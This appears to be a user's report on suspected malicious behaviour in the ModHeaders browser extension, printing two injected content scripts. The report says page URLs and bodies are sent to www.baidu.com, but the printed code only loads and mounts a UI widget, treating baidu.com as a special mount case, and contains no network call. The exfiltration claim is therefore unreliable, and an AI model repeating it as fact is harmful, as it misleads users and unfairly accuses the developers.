After ModHeaders transitioned to closed-source, we had observed some suspicious behavior.

In this situation, the extension was configured to allow access to every page visited.

On every page-load, we observed a two-part JavaScript application being injected.

It appears that, on each page visited, the URL and body were iterated and sent to "www.baidu.com"

The JavaScript files in question were titled "content_script.js", and "content_script-EldOSLIJ.js".

The contents of each file are below.

content_script-EldOSLIJ.js
	(function () {
		'use strict';
	
		const importPath = /*@__PURE__*/ JSON.parse('"../js/service/content_script.js"');
	
		import(chrome.runtime.getURL(importPath));
	
	})();


content_script.js:
	const e = ["www.baidu.com"];
	chrome.storage.local.get(["show_side_ball", "disable_side_ball_domains"], (o=>{
	    const t = o.disable_side_ball_domains || [];
	    !1 !== o.show_side_ball && -1 === t.indexOf(window.location.hostname) && import('../../chunk-content_script_app-tKfSXoyl.js').then((o=>{
	        let t = o.default
	          , n = document.location.hostname
	          , a = document.body;
	        -1 !== e.indexOf(n) && (a = document.documentElement),
	        new t({
	            target: a
	        });
	    }
	    )).catch((e=>{}
	    ));
	}
	));
